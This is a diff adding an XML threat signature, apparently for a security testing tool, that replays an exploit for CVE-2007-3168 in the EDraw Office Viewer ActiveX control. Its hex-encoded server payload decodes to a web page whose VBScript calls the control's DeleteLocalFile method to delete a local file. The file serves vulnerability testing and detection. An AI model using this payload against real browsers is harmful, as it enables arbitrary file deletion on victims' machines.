@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Draw Office Viewer Component (edrawofficeviewer.ocx v. 4.0.5.20) Unsafe Method Vulnerability"/>
+    <EngDesc display="true" value="This threat demonstrates a flaw in the Draw Office Viewer ActiveX application, that results in the deletion of arbitrary files. This threat is delivered via a malicious web page, accessible via port 80."/>
+    <Intent display="true">
+      <item value="Standards_Exploitation"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="EDraw"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="EDraw_Office_Viewer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="EDraw_Office_Viewer_Component_4.0.5.20"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4010"/>
+    <CVEID display="true" value="CVE-2007-3168"/>
+    <bugtraqID display="true" value="24230"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="9d298d3bb9df21598263181a818d7ee7"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633172268800156250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1182399250" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F696E6465782E68746D6C20485454502F312E300D0A486F73743A207777772E736974652E6E65740D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6E6E656374696F6E3A20436C6F73650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3020323030204F4B0D0A5468752C203331204D617920323030372031303A30383A343020474D540D0A5365727665723A204170616368650D0A4163636570742D52616E6765733A2062797465730D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E7420547970653A20746578742F68746D6C0D0A0D0A3C68746D6C3E0D0A3C6F626A65637420636C61737369643D27636C7369643A30353341464542412D443936382D343335462D423535372D313946463736333732423142272069643D2774657374273E3C2F6F626A6563743E0D0A3C696E707574206C616E67756167653D5642536372697074206F6E636C69636B3D7472794D65282920747970653D627574746F6E2076616C75653D22436C69636B206865726520746F207374617274207468652074657374223E0D0A3C736372697074206C616E67756167653D277662736372697074273E0D0A20537562207472794D650D0A20204F6E204572726F7220526573756D65204E6578740D0A20202044696D204D794D73670D0A2020204966284D7367426F78282254686973206973206372656174696E672066696C6520433A5C666F6F2E74787422202620766243724C662026205F0D0A202020202020202020202020202252554E2054484953204558504C4F49543F222C34293D766259657329205468656E0D0A20202020746573742E44656C6574654C6F63616C46696C652022633A5C666F6F2E747874220D0A202020204D794D7367203D204D7367426F78202822436865636B206E6F77207468652066696C6520666F6F2E74787422202620766243724C6620262022497427732064656C657465642E222C2036342C22323030372F30352F3231202D204544726177204F66666963652056696577657220436F6D706F6E656E7422290D0A202020456C73650D0A202020204D794D7367203D204D7367426F782028224E6963652C206265207361666521222C2036342C2022323030372F30352F3238202D204544726177204F66666963652056696577657220436F6D706F6E656E7422290D0A202020456E64204966200D0A20456E64205375620D0A3C2F7363726970743E0D0A3C2F68746D6C3E" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
